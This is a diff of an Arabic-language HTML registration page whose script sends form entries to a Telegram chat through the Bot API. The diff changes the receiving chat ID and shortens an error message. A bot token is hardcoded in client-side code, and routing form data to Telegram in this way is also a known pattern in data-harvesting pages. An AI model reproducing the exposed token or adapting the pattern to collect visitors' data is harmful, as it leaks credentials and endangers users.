@@ -32,7 +32,7 @@ button{width:100%;padding:13px;margin-top:20px;background:#1a7a3a;color:white;bo
 </div>
 <script>
 const TOKEN = "8810366366:AAFqb3wl6bCkYCrrsNJGSuABwRYD9VjZhRc";
-const CHAT_ID = "93372553";
+const CHAT_ID = "6002024244";
 document.getElementById('form').addEventListener('submit', async function(e){
 e.preventDefault();
 let name=document.getElementById('name').value;
@@ -44,8 +44,8 @@ document.getElementById('msg').innerText="جاري الإرسال...";
 try{
 let res=await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})});
 if(res.ok){document.getElementById('msg').innerText="تم التسجيل بنجاح ✅";document.getElementById('msg').style.color="green";}
-else{document.getElementById('msg').innerText="خطأ في الإرسال - راجع التوكن";}
-}catch(err){document.getElementById('msg').innerText="خطأ في الاتصال";}
+else{document.getElementById('msg').innerText="خطأ في الإرسال";}}
+catch(err){document.getElementById('msg').innerText="خطأ في الاتصال";}
 });
 </script>
 </body>
